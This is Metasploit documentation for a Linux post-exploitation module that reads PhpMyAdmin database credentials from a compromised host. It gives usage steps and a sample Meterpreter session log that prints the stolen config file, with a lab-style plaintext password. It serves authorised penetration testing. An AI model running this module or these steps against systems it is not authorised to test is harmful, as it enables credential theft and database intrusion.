## Description

This post module gathers PhpMyAdmin Creds from target Linux machine.

* https://www.phpmyadmin.net/downloads/ [Download URL]

## Verification Steps

1. Start `msfconsole`
2. Get a session
3. Do: `use post/linux/gather/phpmyadmin_credsteal`
4. Do: `set SESSION [SESSION]`
5. Do: `run`

## Scenarios

```
msf exploit(multi/handler) > [*] Sending stage (857352 bytes) to 127.0.0.1
[*] Meterpreter session 1 opened (127.0.0.1:4444 -> 127.0.0.1:46066) at 2018-08-18 14:46:52 -0400

msf exploit(multi/handler) > use post/linux/gather/phpmyadmin_credsteal
msf post(linux/gather/phpmyadmin_credsteal) > set SESSION 1
SESSION => 1
msf post(linux/gather/phpmyadmin_credsteal) > exploit

[+] PhpMyAdmin config found!
[+] Extracting config file!

<?php
##
## database access settings in php format
## automatically generated from /etc/dbconfig-common/phpmyadmin.conf
## by /usr/sbin/dbconfig-generate-include
##
## by default this file is managed via ucf, so you shouldn't have to
## worry about manual changes being silently discarded.  *however*,
## you'll probably also want to edit the configuration file mentioned
## above too.
##
$dbuser='phpmyadmin';
$dbpass='Passw0rd';
$basepath='';
$dbname='phpmyadmin';
$dbserver='localhost';
$dbport='3306';
$dbtype='mysql';

[*] Post module execution completed
msf post(linux/gather/phpmyadmin_credsteal) >
```
